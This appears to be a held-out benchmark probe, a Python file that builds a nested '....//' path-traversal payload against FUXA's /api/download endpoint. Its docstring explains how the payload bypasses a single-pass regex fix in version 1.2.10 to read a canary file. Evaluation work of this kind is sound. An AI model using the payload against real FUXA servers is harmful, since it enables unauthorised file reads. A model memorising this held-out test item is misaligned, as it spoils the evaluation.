#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-25951 residual exploit — nested-sequence traversal.

The CVE-2023-31718 fix only added a SINGLE-PASS sanitize regex to the same
report-download sink (server/api/command/index.js):
    const fileName = req.query.name.replace(new RegExp('../','g'), '');
Because the replace runs exactly once, a NESTED sequence `....//` survives it:
the regex (whose source `../` matches <any><any>/) removes the inner `..` + `/`,
and the leftover `..` + trailing `/` re-forms a valid `../`. So `....//` -> `../`
after one pass, and the traversal still reaches the canary. This is exactly the
GHSA-68m5-5w2h-h837 (CVE-2026-25951) "single-pass regex is insufficient against
nested sequences" bypass, hitting the SAME /api/download sink as the seed.

Contract: reaches the canary (flag) on V1 (fuxa 1.2.10) => legitimate incomplete
-patch positive. Closed on V2 (fuxa 1.2.11): normalizeRelativePath()/resolveWithin()
treat `....` as a literal directory name and reject any `..` segment, so the nested
payload no longer traverses (400 invalid_path / not_found, no flag).

NOTE: on V0 (1.1.13, no regex) this nested payload does NOT work — with nothing to
collapse it, `....` stays a literal dir name and no traversal occurs. That is
expected: the residual only manifests once the incomplete regex fix is present.

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

# Nested `....//` x10 -> each collapses to `../` after the single regex pass.
NAME = "....//" * 10 + "canary.txt"


def candidate() -> dict:
    return {
        "probe_id": "cve-2026-25951-nested-dotdot",
        "method": "GET",
        "endpoint": "/api/download",
        "query": {"cmd": "REPORT-DOWNLOAD", "name": NAME},
    }


if __name__ == "__main__":
    print(candidate()["query"]["name"])
